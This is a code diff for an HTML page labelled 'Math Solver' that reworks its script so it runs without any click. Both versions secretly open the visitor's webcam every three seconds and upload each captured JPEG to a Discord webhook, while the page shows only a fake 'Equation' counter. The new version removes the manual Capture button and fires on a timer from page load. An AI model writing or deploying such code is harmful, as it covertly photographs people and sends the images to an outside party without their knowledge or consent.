@@ -30,65 +30,40 @@
         font-size: 24px;
         color: #003580;
       }
-      #capture-btn {
-        display: block;
-        margin: 20px auto;
-        padding: 10px;
-        background-color: #003580;
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        font-size: 20px;
-        cursor: pointer;
-      }
     </style>
   </head>
   <body>
     <h1>Math Solver</h1>
     <img id="math-image" src="" alt="Math Equation">
     <div id="math-equation"></div>
-    <button id="capture-btn">Capture</button>
     <script>
-      var imageCounter = 1;
-      var intervalId = setInterval(function() {
-        captureImage();
-      }, 3000);
+      let imageCounter = 1;
+      const intervalId = setInterval(captureImage, 3000);
 
-      function captureImage() {
-        var video = document.querySelector('video');
-        var canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(function(blob) {
-          var formData = new FormData();
-          formData.append('file', blob, 'math-equation.jpg');
-          var xhr = new XMLHttpRequest();
-          xhr.open('POST', 'https://discord.com/api/webhooks/1111');
-          xhr.send(formData);
-        }, 'image/jpeg', 1.0);
-        var equation = 'Equation ' + imageCounter++;
-        document.getElementById('math-image').src = URL.createObjectURL(canvas.toDataURL());
-        document.getElementById('math-equation').innerHTML = equation;
-      }
-
-      var constraints = { video: { width: 400, height: 300 } };
-      navigator.mediaDevices.getUserMedia(constraints)
-        .then(function(mediaStream) {
-          var video = document.createElement('video');
-          video.srcObject = mediaStream;
+      async function captureImage() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({video: true, width: 400, height: 300});
+          const video = document.createElement('video');
+          video.srcObject = stream;
           video.play();
           document.body.appendChild(video);
-        })
-        .catch(function(err) {
-          console.log(err.name + ": " + err.message);
-        });
-
-      var captureBtn = document.getElementById('capture-btn');
-      captureBtn.addEventListener('click', function() {
-        clearInterval(intervalId);
-        captureImage();
-      });
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 1.0));
+          const formData = new FormData();
+          formData.append('file', blob, 'math-equation.jpg');
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', 'https://discord.com/api/webhooks/1111');
+          xhr.send(formData);
+          const equation = `Equation ${imageCounter++}`;
+          document.getElementById('math-image').src = canvas.toDataURL();
+          document.getElementById('math-equation').innerHTML = equation;
+        } catch (error) {
+          console.log(error.name + ": " + error.message);
+        }
+      }
     </script>
   </body>
 </html>
